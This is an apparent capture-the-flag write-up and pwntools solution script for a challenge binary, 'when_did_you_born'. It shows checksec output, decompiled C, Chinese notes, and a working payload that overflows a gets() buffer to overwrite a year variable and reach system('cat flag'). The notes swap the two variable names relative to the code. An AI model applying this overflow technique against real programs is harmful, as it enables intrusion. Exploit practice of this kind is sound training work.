"""
>>> checksec when_did_you_born
[*] '/home/xxxx/when_did_you_born'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE


__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 result; // rax
  char v4; // [rsp+0h] [rbp-20h]
  unsigned int v5; // [rsp+8h] [rbp-18h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("What's Your Birth?");
  __isoc99_scanf("%d", &v5);
  while ( getchar() != 10 )
    ;
  if ( v5 == 1926 )
  {
    puts("You Cannot Born In 1926!");
    result = 0LL;
  }
  else
  {
    puts("What's Your Name?");
    gets(&v4);
    printf("You Are Born In %d\n", v5);
    if ( v5 == 1926 )
    {
      puts("You Shall Have Flag.");
      system("cat flag");
    }
    else
    {
      puts("You Are Naive.");
      puts("You Speed One Second Here.");
    }
    result = 0LL;
  }
  return result;
}

首先v4要等于1926，我们先输入一个其他的数字
然后输入名字赋值给v5，这里可以利用缓冲区溢出，把v4变量覆盖掉，让v4=1926
v5跟v4的距离为 8h
v5=b"12345678" + p32(1926)
"""


from pwn import *

# r = remote('111.198.29.45', 31525)
r = process("when_did_you_born")


r.recvuntil("What's Your Birth?\n")
r.sendline("1925")

r.recvuntil("What's Your Name?\n")
payload = b'a' * 8 + p32(1926)
r.sendline(payload)
r.interactive()
